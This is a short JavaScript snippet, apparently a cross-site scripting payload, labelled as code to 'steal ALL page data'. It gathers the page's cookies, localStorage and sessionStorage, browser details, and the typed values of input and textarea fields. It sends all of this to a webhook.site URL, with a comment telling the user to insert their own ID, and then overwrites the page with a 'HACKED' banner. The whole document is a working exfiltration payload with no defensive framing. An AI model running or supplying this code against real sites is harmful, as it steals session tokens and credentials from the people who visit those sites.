// Steal ALL page data immediately
(function(){
  var victim = {
    url: window.location.href,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screen: screen.width+'x'+screen.height,
    referrer: document.referrer,
    title: document.title,
    forms: Array.from(document.forms).map(f=>f.name||f.id||'unnamed'),
    inputs: Array.from(document.querySelectorAll('input,textarea')).map(i=>({name:i.name||i.id||'',type:i.type,value:i.value.substring(0,100)}))
  };
  
  // Exfil to webhook (replace YOUR-ID with free webhook.site ID)
  fetch('https://webhook.site/YOUR-ID?data='+encodeURIComponent(JSON.stringify(victim)))
    .then(()=>console.log('All data stolen!'));
    
  // Visual confirmation
  document.body.innerHTML = '<h1 style="color:red">HACKED - All data stolen!</h1>';
})();
